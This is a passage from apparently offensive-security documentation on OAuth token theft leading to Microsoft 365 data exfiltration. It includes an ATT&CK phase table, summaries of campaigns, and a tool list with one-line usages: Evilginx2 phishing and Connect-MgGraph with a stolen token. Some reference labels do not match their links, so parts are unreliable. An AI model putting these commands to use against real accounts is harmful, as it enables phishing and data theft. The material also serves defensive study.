| **4** | **Collection** | [T1530] Data from Cloud Storage (OneDrive, SharePoint) | [CHAIN-003] Token Theft to Data Exfil |
| **5** | **Collection** | [T1114] Email Collection (via Graph API) | [CHAIN-003] Token Theft to Data Exfil |
| **6** | **Exfiltration** | **[T1537] Transfer Data to Cloud Account** | **Current Phase** |
| **7** | **Impact** | [T1537] Data Exfiltration (to attacker infrastructure) | Related to [CHAIN-001] & [CHAIN-002] for broader impact |

---

## 12. REAL-WORLD EXAMPLES

### Example 1: Evilginx2 Campaign - "Restless Guests" (2024)

- **Research Team:** Mandiant / FLARE
- **Technique:** AiTM phishing via Evilginx2 → OAuth token theft → M365 exfiltration
- **Scope:** Global targeting of US/EU organizations
- **Impact:** Unauthorized access to Exchange, SharePoint, Teams; customer data exposure
- **Indicators:** Evilginx2 phishing pages, anomalous Graph API bulk exports
- **Reference:** [Mandiant - Restless Guests](https://www.mandiant.com/resources/blog/apt-campaigns-exploiting-guest-accounts)

### Example 2: BEC Campaign - Refresh Token Persistence (2023)

- **Attacker Group:** TA505 (financially motivated)
- **Technique:** Phishing → token theft → persistent access via refresh token rotation
- **Duration:** 90+ days undetected using single refresh token
- **Impact:** €2.3M wire fraud; executive impersonation via email account access
- **Detection:** Bulk eDiscovery export request triggered SOC alert
- **Reference:** [Proofpoint - TA505 M365 Attacks](https://www.proofpoint.com/us/threat-insights/post/ta505-targets)

### Example 3: MOVEit + Token Theft Chain (2023)

- **Vulnerability:** MOVEit RCE → LDAP credential extraction → token generation
- **Attack Path:** Compromised MOVEit server → AD credentials leaked → Azure AD Connect token stolen → M365 access
- **Impact:** Full M365 tenant access; customer data exfiltration
- **Reference:** [CISA - MOVEit Advisory](https://www.cisa.gov/news-events/alerts/2023/06/02/cisa-adds-two-known-exploited-vulnerabilities-catalog)

---

## 13. TOOLS & REFERENCES

### Essential Tools

1. **[Evilginx2](https://github.com/kgretzky/evilginx2)** (v3.1.0+)
   - **Purpose:** Adversary-in-the-middle phishing; OAuth token capture
   - **Usage:** `evilginx2 -p ./phish`
   - **Platform:** Linux

2. **[Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell)** (v2.0+)
   - **Purpose:** Query Graph API with stolen tokens
   - **Usage:** `Connect-MgGraph -AccessToken $token`
   - **Platform:** Windows, Linux, macOS

3. **[JWT.io / jwt-decode](https://jwt.io)**
   - **Purpose:** Decode and analyze OAuth tokens
   - **Usage:** Paste token to analyze claims
   - **Platform:** Online

4. **[Postman](https://www.postman.com/downloads/)**
   - **Purpose:** Graph API requests with stolen tokens (GUI-friendly)
   - **Usage:** Import OAuth token; execute API calls
   - **Platform:** Cross-platform

5. **[Burp Suite Community](https://portswigger.net/burp/community/download)**
   - **Purpose:** Intercept OAuth flows; analyze token exchanges
   - **Platform:** Cross-platform

### Reference Documentation

- [MITRE ATT&CK T1528: Steal Application Access Token](https://attack.mitre.org/techniques/T1528/)
- [MITRE ATT&CK T1537: Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537/)
- [Microsoft Threat Labs - Token Theft Incident Response Playbook](https://threatlabsnews.xcitium.com/blog/token-theft-incident-response-playbook-for-microsoft-365/)
- [Microsoft 365 API Security Guide](https://learn.microsoft.com/en-us/graph/security-concepts)
- [OWASP OAuth 2.0 Threat Model](https://tools.ietf.org/html/rfc6819)

---